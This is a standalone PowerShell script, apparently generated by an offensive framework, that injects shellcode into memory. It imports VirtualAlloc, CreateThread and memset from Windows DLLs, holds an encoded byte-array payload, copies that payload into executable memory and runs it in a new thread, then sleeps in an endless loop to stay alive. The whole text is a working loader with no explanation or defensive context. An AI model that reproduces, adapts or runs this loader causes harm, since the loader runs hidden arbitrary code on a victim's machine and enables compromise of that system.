$FiG = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $FiG -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xd3,0xab,0xe9,0xd4,0xda,0xcd,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x13,0x83,0xc5,0x04,0x03,0x45,0xdc,0x49,0x1c,0x28,0x0a,0x0f,0xdf,0xd1,0xca,0x70,0x69,0x34,0xfb,0xb0,0x0d,0x3c,0xab,0x00,0x45,0x10,0x47,0xea,0x0b,0x81,0xdc,0x9e,0x83,0xa6,0x55,0x14,0xf2,0x89,0x66,0x05,0xc6,0x88,0xe4,0x54,0x1b,0x6b,0xd5,0x96,0x6e,0x6a,0x12,0xca,0x83,0x3e,0xcb,0x80,0x36,0xaf,0x78,0xdc,0x8a,0x44,0x32,0xf0,0x8a,0xb9,0x82,0xf3,0xbb,0x6f,0x99,0xad,0x1b,0x91,0x4e,0xc6,0x15,0x89,0x93,0xe3,0xec,0x22,0x67,0x9f,0xee,0xe2,0xb6,0x60,0x5c,0xcb,0x77,0x93,0x9c,0x0b,0xbf,0x4c,0xeb,0x65,0xbc,0xf1,0xec,0xb1,0xbf,0x2d,0x78,0x22,0x67,0xa5,0xda,0x8e,0x96,0x6a,0xbc,0x45,0x94,0xc7,0xca,0x02,0xb8,0xd6,0x1f,0x39,0xc4,0x53,0x9e,0xee,0x4d,0x27,0x85,0x2a,0x16,0xf3,0xa4,0x6b,0xf2,0x52,0xd8,0x6c,0x5d,0x0a,0x7c,0xe6,0x73,0x5f,0x0d,0xa5,0x1b,0xac,0x3c,0x56,0xdb,0xba,0x37,0x25,0xe9,0x65,0xec,0xa1,0x41,0xed,0x2a,0x35,0xa6,0xc4,0x8b,0xa9,0x59,0xe7,0xeb,0xe0,0x9d,0xb3,0xbb,0x9a,0x34,0xbc,0x57,0x5b,0xb9,0x69,0xcd,0x5e,0x2d,0x98,0x13,0x4b,0x22,0xf4,0x11,0x8b,0x2d,0x59,0x9f,0x6d,0x1d,0x31,0xcf,0x21,0xdd,0xe1,0xaf,0x91,0xb5,0xeb,0x3f,0xcd,0xa5,0x13,0xea,0x66,0x4f,0xfc,0x43,0xde,0xe7,0x65,0xce,0x94,0x96,0x6a,0xc4,0xd0,0x98,0xe1,0xeb,0x25,0x56,0x02,0x81,0x35,0x0e,0xe2,0xdc,0x64,0x98,0xfd,0xca,0x03,0x24,0x68,0xf1,0x85,0x73,0x04,0xfb,0xf0,0xb3,0x8b,0x04,0xd7,0xc8,0x02,0x91,0x98,0xa6,0x6a,0x75,0x19,0x36,0x3d,0x1f,0x19,0x5e,0x99,0x7b,0x4a,0x7b,0xe6,0x51,0xfe,0xd0,0x73,0x5a,0x57,0x85,0xd4,0x32,0x55,0xf0,0x13,0x9d,0xa6,0xd7,0xa5,0xe1,0x70,0x11,0xd0,0x0b,0x41;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$gJiW=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($gJiW.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$gJiW,0,0,0);for (;;){Start-sleep 60};
